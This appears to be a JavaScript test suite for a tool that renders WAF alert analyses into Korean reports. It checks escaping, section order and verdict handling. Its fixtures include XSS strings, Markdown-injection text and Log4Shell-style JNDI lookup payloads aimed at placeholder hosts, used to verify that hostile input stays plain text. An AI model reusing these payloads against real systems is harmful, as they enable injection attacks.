import assert from "node:assert/strict";
import test from "node:test";

import { buildAnalysisReport, decodeReportText } from "./analysisReport.js";
import { parseApiDocument } from "./apiDocument.js";
import { decodingEncodingText, decodingWarningText } from "./analystView.js";

function fixture() {
  return {
    id: "synthetic-analysis", event_id: "synthetic-event", analysis_purpose: "test", ingest_channel: "test_lab",
    status: "completed", company_name: "합성 회사", source_system: "synthetic-source",
    src_ip: "192.0.2.1", dest_ip: "198.51.100.1", src_port: 0, dest_port: 443,
    waf_vendor: "synthetic", waf_action: "D", signature: "Synthetic Signature", event_name: "합성 이벤트", review_state: "confirmed",
    verdict: "false_positive", severity: "NONE", confidence_score: 0.1, summary_ko: "STALE_SUMMARY",
    input_truncated: true, model_profile: "synthetic-model", prompt_version: "waf-judgment-v2.1",
    created_at: "2026-09-05T00:00:00.000Z", started_at: "2026-09-05T00:00:00.100Z", completed_at: "2026-09-05T00:00:00.250Z",
    total_elapsed_ms: 250, queue_wait_ms: 100, processing_duration_ms: 150, error_code: null,
    result: {
      schema_version: "waf-analysis-v2", verdict: "true_positive", confidence_score: 0.87,
      summary_ko: "저장된 최종 판정의 합성 요약입니다.", input_truncated: false,
      threat_analysis: { severity: "HIGH", category: "synthetic-category", target: "payload.query", technique_ko: "합성 기법", obfuscations: ["url_encoding"], potential_impact_ko: "조건 충족 시 잠재 영향" },
      signature_assessment: { relation: "exact", explanation_ko: "합성 관계 설명" },
      evidence: [{ field: "payload.query", excerpt: "q=synthetic", interpretation_ko: "합성 관찰과 판정 연결" }],
      conflicting_evidence: ["합성 반대 근거"], recommended_checks: ["합성 확인 작업"],
      tuning_recommendation: { recommended: false, scope: null, proposal_ko: null, risk_ko: "합성 위험", validation_ko: null },
      verifier: { executed: true, agreement: true, reasons: ["low_confidence"], failure_id: null },
    },
  };
}

function parsed(detail, options) { return parseApiDocument(buildAnalysisReport(detail, options)); }
function blocks(document) { return [...document.intro, ...document.sections.flatMap((section) => section.blocks)]; }
function cell(document, label) {
  const row = blocks(document).filter((block) => block.type === "table").flatMap((block) => block.rows).find((row) => row[0] === label);
  assert.ok(row, `Missing report cell: ${label}`);
  return decodeReportText(row[1]);
}
function text(document) {
  return [document.title, ...document.sections.map((section) => section.title), ...blocks(document).flatMap((block) => {
    if (block.type === "code") return block.text.slice(0, -1);
    if (block.type === "table") return [...block.headers, ...block.rows.flat()].map(decodeReportText);
    if (block.type === "list") return block.items.map(decodeReportText);
    return decodeReportText(block.text);
  })].join("\n");
}

test("candidate validation reports name the model-validation ingest channel without changing stored metadata", () => {
  const detail = { ...fixture(), ingest_channel: "model_validation" };
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "유입 경로"), "모델 검증 (model_validation)");
  assert.equal(detail.ingest_channel, "model_validation");
});

test("report orders analysis and evidence before other material and always ends with additional checks", () => {
  for (const includeAppendix of [false, true]) {
    const detail = fixture();
    const decoding = { items: [], decoder_version: "synthetic-v2", scanned_chars: 0, total_chars: 0 };
    const document = parsed(detail, { includeAppendix, decoding });
    const titles = document.sections.map(section => section.title);
    assert.equal(titles[0], "판정 요약");
    assert.ok(titles.indexOf("세부 분석") < titles.indexOf("판정 근거"));
    assert.match(text(document), /탐지 내용과 요청의 연관성/);
    assert.ok(titles.indexOf("판정 근거") < titles.indexOf("WAF 정책 검토"));
    assert.ok(titles.indexOf("WAF 정책 검토") < titles.indexOf("인코딩·난독화 문자열"));
    assert.ok(titles.indexOf("소요 시간") < titles.indexOf("추가 확인 사항"));
    if (includeAppendix) assert.ok(titles.indexOf("부록 · 실행 정보") < titles.indexOf("추가 확인 사항"));
    assert.equal(titles.at(-1), "추가 확인 사항");
    assert.match(text(document), /필요한 경우 아래 자료/);
    assert.doesNotMatch(text(document), /판정 보류를 해소하려면|판단 보류\(inconclusive\)는/);
  }
});

test("decisive results without checks hide the section while inconclusive results retain honest final guidance", () => {
  for (const verdict of ["true_positive", "false_positive"]) {
    const detail = fixture();
    detail.result.verdict = verdict;
    detail.result.confidence_score = 0.97;
    detail.result.recommended_checks = [];
    assert.ok(!parsed(detail).sections.some(section => section.title === "추가 확인 사항"));
    detail.result.recommended_checks = ["합성 후속 확인"];
    assert.ok(parsed(detail).sections.some(section => section.title === "추가 확인 사항"));
    detail.result.analyst_guidance = { checks: [], limitations: ["합성 입력 제한 안내"] };
    assert.ok(!parsed(detail).sections.some(section => section.title === "추가 확인 사항"));
    assert.match(text(parsed(detail)), /합성 입력 제한 안내/);
  }
  const detail = fixture();
  detail.result.verdict = "inconclusive";
  detail.result.analyst_guidance = { checks: [] };
  const report = parsed(detail, { includeAppendix: true });
  assert.equal(report.sections.at(-1).title, "추가 확인 사항");
  assert.match(text(report), /판정 보류를 해소하려면 아래 자료/);
  assert.match(text(report), /구체적인 확인 자료는 기록되지 않았습니다/);
  for (const status of ["pending", "processing", "failed"]) {
    detail.status = status;
    assert.ok(!parsed(detail).sections.some(section => section.title === "추가 확인 사항"));
  }
});

test("report groups exact shared evidence once while preserving different interpretations and original field distinctions", () => {
  const detail = fixture();
  const item = detail.result.evidence[0];
  const opposite = "합성 반대 해석: 정상 문자열 저장 가능성도 있습니다.";
  detail.result.evidence = [item, { ...item }, { ...item, interpretation_ko: opposite }, { ...item, field: "payload.body" }];
  const before = JSON.stringify(detail);
  const report = parsed(detail);
  const quotations = blocks(report).filter(block => block.type === "code");
  assert.equal(quotations.length, 2);
  assert.ok(quotations.every(block => block.text.slice(0, -1) === item.excerpt));
  assert.ok(text(report).includes(item.interpretation_ko));
  assert.ok(text(report).includes(opposite));
  assert.equal(text(report).split(opposite).length - 1, 1);
  assert.ok(!text(report).includes("같은 원문에 대한 관련 설명을 함께 표시했습니다."));
  assert.ok(!text(report).includes("서로 다른 해석"));
  assert.equal(JSON.stringify(detail), before);
});

test("historical grounding-only work is an honest report limitation, not an additional-check task", () => {
  const detail = fixture();
  const diagnostic = "일부 LLM 근거가 지정된 필드의 원문과 일치하지 않아 제외되었습니다. 남은 근거를 직접 확인하세요.";
  const limitation = "일부 발췌는 지정한 원문에서 확인되지 않아 판정 근거에서 제외했습니다.";
  detail.result.recommended_checks = [diagnostic];
  detail.result.analyst_guidance = { checks: [{ source_ko: "운영 자료", check_ko: diagnostic, why_ko: "후속 확인" }], limitations: [limitation] };
  const document = parsed(detail);
  assert.ok(!document.sections.some(section => section.title === "추가 확인 사항"));
  assert.equal(text(document).split(limitation).length - 1, 1);
  assert.ok(!text(document).includes(diagnostic));
  assert.ok(document.sections.some(section => section.title === "해석 시 주의할 점"));
});

test("analyst report suppresses empty optional sections but retains no-change policy warnings and exact source paths", () => {
  const detail = fixture();
  detail.result.conflicting_evidence = [];
  detail.result.threat_analysis.obfuscations = [];
  detail.result.tuning_recommendation = { recommended: false, scope: null, proposal_ko: null, risk_ko: null, validation_ko: null };
  const document = parsed(detail);
  assert.ok(!document.sections.some(section => ["함께 고려할 정황", "WAF 정책 검토"].includes(section.title)));
  assert.match(text(document), /요청 파라미터/);
  assert.match(text(document), /payload.query/);
  assert.doesNotMatch(text(document), /### 난독화|판정 해석|시그니처 평가|같은 원문에 대한 관련 설명/);
  detail.result.tuning_recommendation.risk_ko = "차단 예외 범위를 넓히면 다른 공격이 허용될 수 있습니다.";
  const withRisk = parsed(detail);
  assert.ok(withRisk.sections.some(section => section.title === "WAF 정책 검토"));
  assert.equal(cell(withRisk, "변경 시 주의사항"), detail.result.tuning_recommendation.risk_ko);
  assert.equal(cell(withRisk, "제안 여부"), "false");
});

test("the stored final result takes priority and the decision is the first section", () => {
  const detail = fixture();
  const document = parsed(detail);
  assert.equal(document.title, "WAF 분석 보고서");
  assert.equal(document.sections[0].title, "판정 요약");
  assert.equal(document.sections[1].title, "분석 개요");
  assert.equal(cell(document, "판정"), "정탐 (true_positive)");
  assert.equal(cell(document, "위협 심각도"), "HIGH");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "모델 자기평가 신뢰도"), "0.87 (87%)");
  assert.equal(cell(document, "입력 잘림"), "없음 (false)");
  assert.ok(text(document).includes(detail.result.summary_ko));
  assert.ok(!text(document).includes("STALE_SUMMARY"));
  assert.ok(text(document).includes("WAF 설정을 자동 변경하지 않습니다"));
  assert.ok(!text(document).includes("Label"));
  assert.ok(!text(document).includes("독립 검증"));
  assert.ok(!text(document).includes("모델 자기평가 신뢰도"));
});

test("zeros, false, null and explicit final null are not replaced by fallback values", () => {
  const detail = fixture();
  detail.result.confidence_score = 0;
  detail.result.verdict = null;
  detail.result.summary_ko = null;
  detail.total_elapsed_ms = 0;
  detail.queue_wait_ms = null;
  detail.processing_duration_ms = undefined;
  const document = parsed(detail);
  assert.equal(cell(document, "판정"), "미기록 (null)");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "모델 자기평가 신뢰도"), "0 (0%)");
  assert.equal(cell(document, "Source Port"), "0");
  assert.equal(cell(document, "제안 여부"), "false");
  assert.equal(cell(document, "전체 경과 시간"), "0 ms");
  assert.equal(cell(document, "큐 대기 시간"), "미측정 (null)");
  assert.equal(cell(document, "처리 경과 시간"), "미측정");
  assert.ok(!text(document).includes("STALE_SUMMARY"));
});

test("pending, processing and failed analyses remain non-final even with stored results", () => {
  for (const status of ["pending", "processing", "failed"]) {
    const detail = fixture();
    detail.status = status;
    detail.error_code = status === "failed" ? "agent_context_budget_too_small" : null;
    const document = parsed(detail);
    assert.equal(document.title, "WAF 분석 상태 보고서");
    assert.equal(document.sections[0].title, "저장된 판정 정보 (최종 아님)");
    assert.ok(text(document).includes("최종 판정 보고서가 아닙니다"));
    if (status === "failed") assert.equal(cell(parsed(detail, { includeAppendix: true }), "분석 실패 코드"), "agent_context_budget_too_small");
  }
});

test("missing result and malformed optional objects produce an honest report without exceptions", () => {
  const detail = fixture();
  detail.result = null;
  const document = parsed(detail);
  assert.equal(document.title, "WAF 분석 상태 보고서");
  assert.ok(text(document).includes("저장된 결과 본문이 없어"));
  assert.ok(buildAnalysisReport(null).includes("WAF 분석 상태 보고서"));
  detail.result = { summary_ko: { api_key: "NEVER_DUMP_THIS_OBJECT" }, evidence: [null, false, {}], threat_analysis: [] };
  assert.ok(!buildAnalysisReport(detail).includes("NEVER_DUMP_THIS_OBJECT"));
});

test("every persisted stub marker identifies a mock report including legacy stub", () => {
  for (const mark of [
    (detail) => { detail.model_profile = "stub-no-llm"; },
    (detail) => { detail.prompt_version = "stub-v0"; },
    (detail) => { detail.result.agent = { framework: "stub" }; },
    (detail) => { detail.result.policy = { prompt_version: "stub-v0" }; },
  ]) {
    const detail = fixture();
    detail.result.schema_version = "waf-analysis-v1";
    mark(detail);
    const document = parsed(detail);
    assert.equal(document.title, "WAF 모의 분석 보고서");
    assert.equal(document.sections[0].title, "모의 판정 정보");
    assert.ok(text(document).includes("실제 LLM의 보안 판정이나 공격 여부를 입증하는 보고서가 아닙니다"));
  }
});

test("provider identity uses persisted execution metadata, never a profile-name guess", () => {
  const detail = fixture();
  detail.model_profile = "openai-looking-profile-name";
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "LLM Provider"), "미기록");
  detail.result.agent = { llm_provider: "openai", model_name: "synthetic-chat-model" };
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "LLM Provider"), "openai");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "모델 ID"), "synthetic-chat-model");
});

test("the report preserves server evaluation and synthetic source without grading the Primary output", () => {
  const detail = fixture();
  detail.evaluation = { outcome: "abstained", reference_label: { id: "synthetic-label", revision: 3, verdict: "true_positive", source_kind: "synthetic_expected", source_ref: "synthetic-v1", ai_visible: null, created_at: "2026-09-05T01:00:00Z" } };
  detail.result.verdict = "inconclusive";
  detail.result.primary = { verdict: "true_positive", summary_ko: "NEVER_USE_PRIMARY_FOR_EVALUATION" };
  const document = parsed(detail, { includeAppendix: true });
  assert.equal(cell(document, "Label 비교 결과"), "모델 판단 보류");
  assert.equal(cell(document, "참조 Label"), "정탐");
  assert.equal(cell(document, "Label 출처"), "합성 기대값");
  assert.equal(cell(document, "Label 작성 시 AI 결과 열람"), "AI 열람 여부 미확인");
  assert.equal(cell(document, "Label revision"), "3");
  assert.ok(!text(document).includes("NEVER_USE_PRIMARY_FOR_EVALUATION"));
});

test("report reference metadata is allowlisted and malicious source text remains plain text", () => {
  const detail = fixture();
  const source = "synthetic | <img src=https://synthetic.example.test/x> [click](javascript:synthetic) ```\r\n";
  detail.evaluation = { outcome: "match", reference_label: { verdict: "false_positive", source_kind: "reference", source_ref: source, ai_visible: true, revision: 1, payload: "NEVER_INCLUDE_REFERENCE_PAYLOAD", rationale_ko: "NEVER_INCLUDE_REFERENCE_EXPLANATION", api_key: "NEVER_INCLUDE_REFERENCE_SECRET" } };
  const document = parsed(detail, { includeAppendix: true });
  assert.equal(cell(document, "Label 비교 결과"), "지원 판정 일치");
  assert.equal(cell(document, "답안 출처 / 버전"), source);
  assert.ok(!buildAnalysisReport(detail, { includeAppendix: true }).includes("NEVER_INCLUDE_REFERENCE"));
  assert.equal(document.sections.filter((section) => section.title === "부록 · 참조 Label 평가").length, 1);
});

test("report evaluation exclusions and expected abstention remain separate", () => {
  for (const [outcome, expected] of [["stub", "모의 실행 · 평가 제외"], ["failed", "실행 실패 · 평가 제외"], ["unlabeled", "미라벨"], ["input_contaminated", "정답 포함 입력 · 평가 제외"], ["expected_abstention_match", "기대 보류 일치"]]) {
    const detail = fixture();
    detail.evaluation = { outcome, reference_label: null };
    assert.equal(cell(parsed(detail, { includeAppendix: true }), "Label 비교 결과"), expected);
  }
});

test("legacy missing severity and verifier metadata are not inferred", () => {
  const detail = fixture();
  detail.result.schema_version = "waf-analysis-v1";
  delete detail.result.threat_analysis.severity;
  delete detail.result.verifier;
  detail.severity = "CRITICAL";
  const document = parsed(detail, { includeAppendix: true });
  assert.equal(cell(document, "위협 심각도"), "미평가(이전 결과)");
  assert.ok(text(document).includes("독립 검증 실행 정보가 저장되지 않았습니다"));
  assert.ok(!text(document).includes("미실행 (false)"));
});

test("verifier not-run, failure, null agreement and agreed inconclusive remain distinct", () => {
  const detail = fixture();
  detail.result.verifier = { executed: false, agreement: null, reasons: [], failure_id: null };
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "실행 여부"), "미실행 (false)");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "판정 일치 여부"), "해당 없음");
  detail.result.verifier = { executed: true, agreement: false, reasons: ["input_truncated"], failure_id: "synthetic-failure-1" };
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "판정 일치 여부"), "판정 불일치 또는 검증 실패 (false)");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "실패 ID"), "synthetic-failure-1");
  detail.result.verifier.agreement = null;
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "판정 일치 여부"), "미기록 (null)");
  detail.result.verifier.agreement = true;
  detail.result.verdict = "inconclusive";
  detail.result.threat_analysis.severity = "UNKNOWN";
  assert.equal(cell(parsed(detail), "판정"), "판단 보류 (inconclusive)");
  assert.equal(cell(parsed(detail, { includeAppendix: true }), "판정 일치 여부"), "판정 일치 (true)");
});

test("raw payload, snapshots, free-form errors, unknown keys and uncertainties are never read", () => {
  const detail = fixture();
  const forbid = (object, keys) => keys.forEach((key) => Object.defineProperty(object, key, { get() { throw new Error(`Forbidden read: ${key}`); } }));
  forbid(detail, ["payload", "raw", "extra_fields", "agent_runs", "api_key", "error_message"]);
  forbid(detail.result, ["primary", "uncertainties", "raw_payload", "api_key", "unknown_extension"]);
  forbid(detail.result.verifier, ["output", "error", "error_code", "raw_response"]);
  assert.doesNotThrow(() => buildAnalysisReport(detail));
  assert.ok(!buildAnalysisReport(detail).includes("uncertainties"));
});

test("hostile dynamic text cannot introduce headings, lists, tables, links or HTML blocks", () => {
  const detail = fixture();
  const hostile = '  \t# injected\r\n\r\n## injected section\n- injected list\n| x | y |\n| --- | --- |\n<script>alert("synthetic")</script> ![x](https://synthetic.invalid/x) [x](javascript:alert(1)) `code` \\ &amp; &lt; &#10;  ';
  const sections = parsed(detail).sections.map((section) => section.title);
  detail.company_name = hostile;
  detail.result.summary_ko = hostile;
  detail.result.recommended_checks = [hostile];
  detail.result.verifier.reasons = [hostile];
  const document = parsed(detail);
  assert.deepEqual(document.sections.map((section) => section.title), sections);
  assert.equal(cell(document, "회사명"), hostile);
  assert.ok(document.sections[0].blocks.some((block) => block.type === "paragraph" && decodeReportText(block.text) === hostile));
  assert.equal(cell(document, "확인할 내용"), hostile);
  assert.ok(!buildAnalysisReport(detail).includes("<script>"));
});

test("all ASCII punctuation, Unicode and surrounding whitespace round-trip through table cells", () => {
  const detail = fixture();
  const punctuation = Array.from({ length: 94 }, (_, index) => String.fromCharCode(index + 33)).join("");
  const value = `  한글 🛡️ ${punctuation}\t\r\n  next\u2028line\u2029last  `;
  detail.event_name = value;
  assert.equal(cell(parsed(detail), "이벤트명"), value);
  assert.equal(decodeReportText("&amp;lt;"), "&lt;");
  assert.equal(decodeReportText("&amp;#10;"), "&#10;");
  assert.equal(decodeReportText("&quot; &#65;"), "&quot; &#65;");
});

test("evidence fences preserve exact bytes after only the structural LF is removed", () => {
  for (const excerpt of ["", "plain", "line\n", "line\r\n", "line\r", "  \t\n  ", "`````\n## injected\n<script>synthetic</script>\n````\n&amplt;\\r\\n"]) {
    const detail = fixture();
    detail.result.evidence[0].excerpt = excerpt;
    const document = parsed(detail);
    const code = blocks(document).filter((block) => block.type === "code");
    assert.equal(code.length, 1);
    assert.equal(code[0].language, "text");
    assert.equal(code[0].text, excerpt + "\n");
    assert.equal(code[0].text.slice(0, -1), excerpt);
    assert.ok(!document.sections.some((section) => section.title === "injected"));
  }
});

test("long text and many backtick runs remain complete and deterministic without mutating input", () => {
  const detail = fixture();
  detail.company_name = "합성".repeat(10_000);
  detail.result.evidence[0].excerpt = "`x".repeat(100_000);
  const before = JSON.stringify(detail);
  const first = buildAnalysisReport(detail);
  assert.equal(buildAnalysisReport(detail), first);
  assert.equal(JSON.stringify(detail), before);
  assert.equal(cell(parseApiDocument(first), "회사명"), detail.company_name);
  assert.equal(blocks(parseApiDocument(first)).find((block) => block.type === "code").text.slice(0, -1), detail.result.evidence[0].excerpt);
  assert.ok(first.includes("2026\\-09\\-05T00\\:00\\:00\\.000Z"));
});

test("analyst guidance replaces internal diagnostics without changing the saved final verdict or data", () => {
  const detail = fixture();
  detail.result.verdict = "inconclusive";
  detail.result.threat_analysis.severity = "UNKNOWN";
  detail.result.summary_ko = "Primary/Verifier 판정 불일치로 최종 판정을 보류합니다.";
  detail.result.threat_analysis.technique_ko = "독립 검증 실패";
  detail.result.signature_assessment.explanation_ko = "분석 결과가 서로 다릅니다.";
  detail.result.evidence[0].interpretation_ko = "Primary와 Verifier의 판정 불일치";
  detail.result.tuning_recommendation.risk_ko = "판정 불일치 상태";
  detail.result.conflicting_evidence = ["Primary/Verifier verdict 불일치", "실제 업무 요청일 가능성"];
  detail.result.analyst_guidance = {
    summary_ko: "입력값이 실제 데이터 조회 조건으로 처리됐는지 확인이 필요합니다.",
    checks: [{ source_ko: "동일 요청의 애플리케이션 로그", check_ko: "입력값이 쿼리 인자로 전달됐는지 확인하세요.", why_ko: "단순 문자열 저장과 실행되는 조회 조건을 구분할 수 있습니다." }],
    limitations: ["실제 요청 처리 결과는 제공되지 않았습니다."],
  };
  const before = JSON.stringify(detail);
  const document = parsed(detail);
  assert.equal(cell(document, "판정"), "판단 보류 (inconclusive)");
  assert.equal(cell(document, "위협 심각도"), "UNKNOWN");
  assert.equal(cell(document, "확인 위치"), detail.result.analyst_guidance.checks[0].source_ko);
  assert.equal(cell(document, "확인할 내용"), detail.result.analyst_guidance.checks[0].check_ko);
  assert.equal(cell(document, "확인 목적"), detail.result.analyst_guidance.checks[0].why_ko);
  assert.match(text(document), /확정된 공격이나 피해를 뜻하지 않습니다/);
  assert.match(text(document), /세부 분석/);
  assert.match(text(document), /확정된 공격이나 피해를 뜻하지 않습니다/);
  assert.match(text(document), /실제 요청 처리 결과는 제공되지 않았습니다/);
  assert.doesNotMatch(text(document), /Primary|Verifier|독립\s*검증|판정\s*불일치|분석 결과가 서로 다/);
  assert.equal(JSON.stringify(detail), before);
});

test("technical and reference Label details are an explicit appendix, never a default read", () => {
  const detail = fixture();
  // The existing evaluation.outcome='stub' safety marker can still identify a
  // mock execution, but default reports never inspect the reference answer.
  detail.evaluation = { outcome: "match" };
  Object.defineProperty(detail.evaluation, "reference_label", { get() { throw new Error("Unexpected Label read"); } });
  Object.defineProperty(detail.result, "verifier", { get() { throw new Error("Unexpected technical read"); } });
  assert.doesNotThrow(() => buildAnalysisReport(detail));
  const other = fixture();
  const base = buildAnalysisReport(other);
  const extended = buildAnalysisReport(other, { includeAppendix: true });
  const [baseBody, baseChecks] = base.split("## 추가 확인 사항");
  assert.ok(extended.startsWith(baseBody));
  assert.ok(extended.endsWith(`## 추가 확인 사항${baseChecks}`));
  assert.doesNotMatch(base, /## 부록|Label|독립 검증|실패 ID|프롬프트 버전/);
  assert.match(extended, /## 부록 · 참조 Label 평가/);
  assert.match(extended, /## 부록 · 독립 검증/);
  assert.match(extended, /## 부록 · 실행 정보/);
});

function decodingFixture() {
  return {
    decoder_version: "waf-text-decoder-v1", scan_truncated: false, scanned_chars: 200, total_chars: 200,
    warnings: [],
    items: [
      { id: "candidate-1", field: "payload.query", start: 15, end: 32, original: "%253Cscript%253E", decoded: "<script>", warnings: [],
        steps: [{ encoding: "percent", input: "%253Cscript%253E", output: "%3Cscript%3E" }, { encoding: "percent", input: "%3Cscript%3E", output: "<script>" }] },
      { id: "candidate-2", field: "payload.headers.X-Synthetic", start: 90, end: 106, original: "c3ludGhldGlj", decoded: "synthetic", warnings: ["해석 후보"],
        steps: [{ encoding: "base64", input: "c3ludGhldGlj", output: "synthetic" }] },
    ],
  };
}

test("multiple explicitly loaded decoded candidates include exact originals and every transformation", () => {
  const detail = fixture();
  const decoding = decodingFixture();
  const before = JSON.stringify([detail, decoding]);
  const document = parsed(detail, { decoding });
  const code = blocks(document).filter((block) => block.type === "code").map((block) => block.text.slice(0, -1));
  assert.deepEqual(code, [detail.result.evidence[0].excerpt,
    ...decoding.items.flatMap((item) => [item.original, item.decoded, ...item.steps.flatMap((step) => [step.input, step.output])]),
  ]);
  assert.match(text(document), /후보 1 · 변환 2/);
  assert.match(text(document), /문자열 2/);
  assert.match(text(document), /당시 분석에 사용됐다는 뜻이 아니며/);
  assert.match(text(document), /실제로 같은 변환을 수행했거나 공격이 성립한다는 증거도 아닙니다/);
  assert.equal(JSON.stringify([detail, decoding]), before);
});

test("decoding is never obtained from hidden result fields and empty or limited scans never imply benign traffic", () => {
  const detail = fixture();
  for (const target of [detail, detail.result]) Object.defineProperty(target, "decoding", { get() { throw new Error("Unexpected implicit decoding read"); } });
  assert.match(text(parsed(detail)), /아직 원문 기반 디코딩 결과를 조회하지 않았습니다/);
  const decoding = { ...decodingFixture(), items: [], scan_truncated: true, warnings: ["scan_limit"] };
  const document = parsed(detail, { decoding });
  assert.equal(cell(document, "조회 범위 제한"), "true");
  assert.match(text(document), /인코딩 부재나 정상 요청을 보장하지 않습니다/);
  assert.match(text(document), /scan_limit/);
});

test("hostile decoding fields and exact CRLF remain text in both Markdown and rendered blocks", () => {
  const detail = fixture();
  const decoding = decodingFixture();
  const hostile = "`````\r\n## injected\n<img src=https://synthetic.invalid/x onerror=alert(1)>\r\n&amp;";
  const item = decoding.items[0];
  item.field = "payload.headers.X-|<script>synthetic</script>\r\n## injected";
  item.original = hostile;
  item.decoded = hostile;
  item.steps = [{ encoding: "synthetic | <script> ```\n## injected", input: hostile, output: hostile }];
  item.untrusted = "NEVER_INCLUDE_EXTRA_DECODING_FIELD";
  const document = parsed(detail, { decoding });
  const raw = blocks(document).filter((block) => block.type === "code").map((block) => block.text.slice(0, -1));
  assert.equal(raw.filter((value) => value === hostile).length, 4);
  assert.equal(cell(document, "원문 위치"), item.field);
  assert.ok(!document.sections.some((section) => section.title === "injected"));
  assert.ok(!buildAnalysisReport(detail, { decoding }).includes("NEVER_INCLUDE_EXTRA_DECODING_FIELD"));
});

test("JNDI static guidance and conditional defaults are reported without claiming a lookup executed", () => {
  const original = "${${lower:J}ndi:ldap://synthetic.invalid/a}";
  const decoded = "${jndi:ldap://synthetic.invalid/a}";
  const decoding = { ...decodingFixture(), items: [{ id: "jndi-static", field: "payload.headers.User-Agent", start: 50, end: 50 + original.length,
    original, decoded, steps: [{ encoding: "log4j_lookup_static", input: original, output: decoded }],
    warnings: ["default_lookup_candidate", "jndi_lookup_not_executed", "application_decoding_unverified"] }] };
  const before = JSON.stringify(decoding);
  const document = parsed(fixture(), { decoding });
  assert.equal(cell(document, "변환 방식"), decodingEncodingText("log4j_lookup_static"));
  assert.match(text(document), /실행 없는 정적 해석/);
  assert.match(text(document), /속성이 정의되지 않았을 때/);
  assert.match(text(document), /실제 환경의 값은 조회하지 않았습니다/);
  assert.match(text(document), /JNDI 조회와 외부 연결은 수행하지 않았습니다/);
  assert.match(text(document), /공격 성공을 확인할 수 없습니다/);
  const fragments = blocks(document).filter((block) => block.type === "code").map((block) => block.text.slice(0, -1));
  assert.ok(fragments.includes(original)); assert.ok(fragments.includes(decoded));
  assert.equal(JSON.stringify(decoding), before);
});

test("unchanged plain, unresolved and escaped lookup strings retain their original text with no invented steps", () => {
  const values = ["${jndi:ldap://synthetic.invalid/a}", "${env:SYNTHETIC_VAR}", "$${jndi:ldap://synthetic.invalid/b}"];
  const decoding = { ...decodingFixture(), items: values.map((value, index) => ({ id: `static-${index}`, field: "payload.query", start: index * 100, end: index * 100 + value.length,
    original: value, decoded: value, steps: [], warnings: index === 1 ? ["unresolved_lookup"] : ["jndi_lookup_not_executed"] })) };
  const document = parsed(fixture(), { decoding });
  const display = text(document);
  assert.equal((display.match(/변환하지 않음 · 정적 확인 안내/g) || []).length, 3);
  assert.equal((display.match(/변환 없이 보존한 문자열/g) || []).length, 3);
  assert.ok(!display.includes("변환 방식"));
  const fragments = blocks(document).filter((block) => block.type === "code").map((block) => block.text.slice(0, -1));
  for (const value of values) assert.equal(fragments.filter((fragment) => fragment === value).length, 2);
});

test("extended encodings and count-limited scans use the same explanations as the comparison UI", () => {
  for (const encoding of ["url_percent_u", "base64url", "unicode_escape"]) {
    const decoding = { ...decodingFixture(), scan_truncated: true, scanned_chars: 200, total_chars: 200,
      warnings: ["item_limit_reached", "base64_padding_inferred", "legacy_percent_u_candidate", "unicode_codepoint_escape_candidate"],
      items: [{ id: "extended", field: "payload.query", start: 0, end: 1, original: "x", decoded: "y", steps: [{ encoding, input: "x", output: "y" }], warnings: [] }] };
    const document = parsed(fixture(), { decoding });
    assert.equal(cell(document, "변환 방식"), decodingEncodingText(encoding));
    assert.match(text(document), /크기·개수 등 도구 처리 한도/);
    for (const warning of decoding.warnings) assert.ok(text(document).includes(decodingWarningText(warning)));
  }
});
